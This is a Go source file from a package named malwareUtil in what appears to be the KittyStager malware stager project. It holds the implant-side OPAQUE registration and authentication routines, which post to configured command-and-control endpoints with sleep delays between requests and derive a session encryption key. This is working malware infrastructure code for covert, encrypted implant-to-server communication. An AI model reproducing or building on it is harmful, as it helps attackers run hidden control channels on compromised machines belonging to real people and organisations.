package malwareUtil

import (
	"KittyStager/cmd/crypto"
	"KittyStager/cmd/util"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/frekui/opaque"
)

// doPwReg is the OPAQUE registration sequence
func doPwreg(username, password string, conf *util.MalConf) error {
	endpoint1 := conf.Reg1
	endpoint2 := conf.Reg2
	sess, msg1, err := opaque.PwRegInit(username, password, 512)
	if err != nil {
		return err
	}
	data1, err := json.Marshal(msg1)
	if err != nil {
		return err
	}
	sleep(conf.Sleep)
	data2, err := postRequest(data1, conf, endpoint1)
	if err != nil {
		return err
	}
	var msg2 opaque.PwRegMsg2
	if err := json.Unmarshal(data2, &msg2); err != nil {
		return err
	}

	msg3, err := opaque.PwReg2(sess, msg2)
	if err != nil {
		return err
	}
	data3, err := json.Marshal(msg3)
	if err != nil {
		return err
	}
	sleep(conf.Sleep)
	final, err := postRequest(data3, conf, endpoint2)
	if err != nil {
		return err
	}
	if string(final) != "ok" {
		return fmt.Errorf("expected final ok, got %s", string(final))
	}
	return nil
}

// doAuth is the OPAQUE authentication sequence
func doAuth(username, password string, conf *util.MalConf) (string, error) {
	endpoint1 := conf.Auth1
	endpoint2 := conf.Auth2
	sess, msg1, err := opaque.AuthInit(username, password)
	if err != nil {
		return "", err
	}
	data1, err := json.Marshal(msg1)
	if err != nil {
		return "", err
	}
	sleep(conf.Sleep)
	data2, err := postRequest(data1, conf, endpoint1)
	if err != nil {
		return "", err
	}
	var msg2 opaque.AuthMsg2
	if err := json.Unmarshal(data2, &msg2); err != nil {
		return "", err
	}

	sharedSecret, msg3, err := opaque.Auth2(sess, msg2)
	if err != nil {
		return "", err
	}
	data3, err := json.Marshal(msg3)
	if err != nil {
		return "", err
	}
	sleep(conf.Sleep)
	ok, err := postRequest(data3, conf, endpoint2)
	if err != nil {
		return "", err
	}
	if string(ok) != "ok" {
		fmt.Printf("Expected ok, got '%s'", string(ok))
		return "", err
	}
	key := sharedSecret[:16]
	keyB64 := base64.StdEncoding.EncodeToString(key)
	// generate a 32 byte key
	key32 := crypto.GenerateKey(keyB64, 32)
	return key32, nil
}
